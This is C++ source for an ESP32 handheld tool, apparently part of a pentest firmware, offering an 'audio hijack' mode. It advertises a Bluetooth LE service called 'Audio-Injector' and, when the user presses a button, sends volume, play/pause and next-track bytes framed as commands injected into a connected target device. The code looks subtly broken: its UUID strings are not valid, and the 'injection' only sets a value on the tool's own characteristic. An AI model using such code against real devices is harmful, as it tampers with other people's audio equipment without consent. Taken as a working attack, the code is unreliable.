#include "whisperpair_audio.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include <globals.h>

extern GlobalState globalState;
extern BruceConfig bruceConfig;
extern tft_logger tft;
extern volatile int tftWidth, tftHeight;

AudioCommandService::AudioCommandService() : pServer(nullptr), pAudioService(nullptr), pCmdCharacteristic(nullptr), isConnected(false) {}

void AudioCommandService::start() {
    NimBLEDevice::init("Audio-Injector");
    pServer = NimBLEDevice::createServer();

    class ServerCallbacks : public NimBLEServerCallbacks {
        AudioCommandService* parent;
    public:
        ServerCallbacks(AudioCommandService* p) : parent(p) {}
        void onConnect(NimBLEServer* pServer) { parent->isConnected = true; }
        void onDisconnect(NimBLEServer* pServer) { parent->isConnected = false; }
    };

    pServer->setCallbacks(new ServerCallbacks(this));

    pAudioService = pServer->createService("AUDIO1234-5678-9012-3456-789012345678");
    pCmdCharacteristic = pAudioService->createCharacteristic(
        "CMD1234-5678-9012-3456-789012345678",
        NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::WRITE_NR
    );

    pAudioService->start();
    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(pAudioService->getUUID());
    pAdvertising->start();
}

void AudioCommandService::stop() {
    if(pServer) {
        NimBLEDevice::deinit(true);
    }
}

void AudioCommandService::injectCommand(const uint8_t* cmd, size_t len) {
    if(pCmdCharacteristic && isConnected) {
        pCmdCharacteristic->setValue(cmd, len);
    }
}

bool AudioCommandService::isDeviceConnected() {
    return isConnected;
}

void audioCommandHijackTest() {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("1. Start audio service");
    tft.setCursor(20, 90);
    tft.print("2. Connect target device");
    tft.setCursor(20, 120);
    tft.print("3. Inject audio commands");
    tft.setCursor(20, 160);
    tft.print("SEL: Start  ESC: Back");

    while(true) {
        if(check(EscPress) || check(SelPress)) break;
        delay(50);
    }

    if(check(EscPress)) return;

    showAdaptiveMessage("Starting audio service...", "", "", "", 0xFFFF, false, true);
    AudioCommandService audioCmd;
    audioCmd.start();

    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO INJECTION");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Service: RUNNING");
    tft.setCursor(20, 90);
    tft.print("Waiting for connection...");
    tft.setCursor(20, 120);
    tft.print("Connected: ");
    tft.setCursor(120, 120);
    if(audioCmd.isDeviceConnected()) {
        tft.print("YES");
    } else {
        tft.print("NO");
    }

    tft.setCursor(20, 160);
    tft.print("SEL: Inject  ESC: Stop");

    unsigned long startTime = millis();
    while(millis() - startTime < 30000) {
        if(check(EscPress)) {
            audioCmd.stop();
            showAdaptiveMessage("Service stopped", "OK", "", "", 0xFFFF, true, false);
            return;
        }

        if(check(SelPress)) {
            if(audioCmd.isDeviceConnected()) {
                uint8_t volume_up[] = {0x01, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(volume_up, 4);
                showAdaptiveMessage("Volume up sent!", "", "", "", 0x07E0, false, true);
                delay(500);

                uint8_t play_pause[] = {0x02, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(play_pause, 4);
                showAdaptiveMessage("Play/Pause sent!", "", "", "", 0x07E0, false, true);
                delay(500);

                uint8_t next_track[] = {0x03, 0x00, 0x00, 0x00};
                audioCmd.injectCommand(next_track, 4);
                showAdaptiveMessage("Next track sent!", "", "", "", 0x07E0, false, true);
                delay(500);
            } else {
                showErrorMessage("No device connected!");
                delay(1000);
            }
        }
        delay(100);
    }

    audioCmd.stop();
    showAdaptiveMessage("Timeout - service stopped", "OK", "", "", 0xFFFF, true, false);
}